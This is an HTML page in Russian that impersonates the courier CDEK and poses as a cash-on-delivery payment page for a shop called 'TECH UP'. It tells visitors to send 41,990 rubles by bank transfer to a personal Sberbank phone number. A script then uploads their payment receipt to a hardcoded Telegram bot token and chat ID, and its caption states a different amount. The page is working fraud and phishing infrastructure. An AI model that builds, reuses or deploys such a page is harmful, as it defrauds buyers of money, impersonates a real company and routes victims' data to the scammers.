<!DOCTYPE html>

<html lang="ru">

<head>

    <meta charset="UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Пополнение наложенного платежа — TECH UP</title>

    <style>

        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }

        .payment-card { background: white; width: 100%; max-width: 420px; padding: 35px; border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); }

        

        /* Шапка с заголовком и логотипом */

        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; border-bottom: 1px solid #eee; padding-bottom: 15px; }

        .header h2 { margin: 0; font-size: 19px; color: #1a1a1a; letter-spacing: -0.5px; max-width: 60%; line-height: 1.2; }

        

        /* Официальный векторный логотип СДЭК */

        .logo-sdek-img { width: 110px; height: auto; display: block; }

        

        .step { display: flex; margin-bottom: 20px; align-items: flex-start; }

        .step-number { background-color: #21a038; color: white; width: 22px; height: 22px; border-radius: 50%; display: flex; justify-content: center; align-items: center; font-size: 13px; font-weight: bold; margin-right: 14px; flex-shrink: 0; margin-top: 3px; }

        .step-text { font-size: 15px; line-height: 1.5; color: #444; }

        .highlight { font-weight: 700; color: #000; }

        

        .bank-info { background: #e8f5e9; padding: 10px 14px; border-radius: 8px; display: inline-flex; align-items: center; margin-top: 8px; border: 1px solid #c8e6c9; }

        .bank-icon { background: #21a038; width: 22px; height: 22px; border-radius: 50%; margin-right: 10px; display: flex; justify-content: center; align-items: center; color: white; font-weight: bold; font-size: 12px; }

        

        .upload-area { border: 2px dashed #ccd0d5; border-radius: 12px; padding: 20px; text-align: center; color: #65676b; cursor: pointer; margin-top: 25px; transition: all 0.2s ease; background-color: #f8f9fa; }

        .upload-area:hover { border-color: #21a038; background: #f1f8f2; color: #21a038; }

        .upload-icon { font-size: 28px; margin-bottom: 8px; display: block; }

    </style>

</head>

<body>



<div class="payment-card">

    <div class="header">

        <h2>Пополнение наложенного платежа</h2>

        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/14/CDEK_logo.svg/1280px-CDEK_logo.svg.png" class="logo-sdek-img" alt="СДЭК">

    </div>



    <div class="step">

        <div class="step-number">1</div>

        <div class="step-text">Откройте мобильное приложение вашего банка</div>

    </div>



    <div class="step">

        <div class="step-number">2</div>

        <div class="step-text">Найдите раздел <span class="highlight">"Переводы"</span> или <span class="highlight">"СБП"</span></div>

    </div>



    <div class="step">

        <div class="step-number">3</div>

        <div class="step-text">

            Введите реквизиты:

            <br>

            <div class="bank-info">

                <div class="bank-icon">S</div>

                <span class="highlight">Сбербанк +7 (999) 095-11-26</span>

            </div>

        </div>

    </div>



    <div class="step">

        <div class="step-number">4</div>

        <div class="step-text">Сумма к оплате — <span class="highlight" style="font-size: 18px;">41 990 ₽</span></div>

    </div>



    <div class="step">

        <div class="step-number">5</div>

        <div class="step-text">В комментарии укажите: <br> <span class="highlight">резерв</span></div>

    </div>



    <div class="upload-area" onclick="document.getElementById('fileInput').click()">

        <span class="upload-icon">📄</span>

        <strong id="statusText">Загрузить чек об оплате</strong>

        <input type="file" id="fileInput" style="display:none" accept="image/*" onchange="sendToTelegram()">

    </div>

</div>



<script>

async function sendToTelegram() {

    const fileInput = document.getElementById('fileInput');

    const statusText = document.getElementById('statusText');

    

    // Данные твоего бота

    const token = "8395939447:AAEwlsyGVyI6rnDf_dA7Z8dqQOisYxdNEY0";

    const chatId = "8556442142";



    if (fileInput.files.length === 0) return;



    statusText.innerText = "Отправка...";

    const file = fileInput.files[0];

    const formData = new FormData();

    formData.append("chat_id", chatId);

    formData.append("photo", file);

    formData.append("caption", "✅ Новый чек!\nСумма: 12 700 ₽\nМагазин: TECH UP");



    try {

        const response = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {

            method: "POST",

            body: formData

        });

        if (response.ok) {

            statusText.innerText = "✅ Чек успешно отправлен!";

            statusText.style.color = "#21a038";

        } else {

            const errorData = await response.json();

            statusText.innerText = "❌ Ошибка бота";

            console.error(errorData);

        }

    } catch (e) {

        statusText.innerText = "❌ Ошибка сети";

        console.error(e);

    }

}

</script>



</body>

</html>
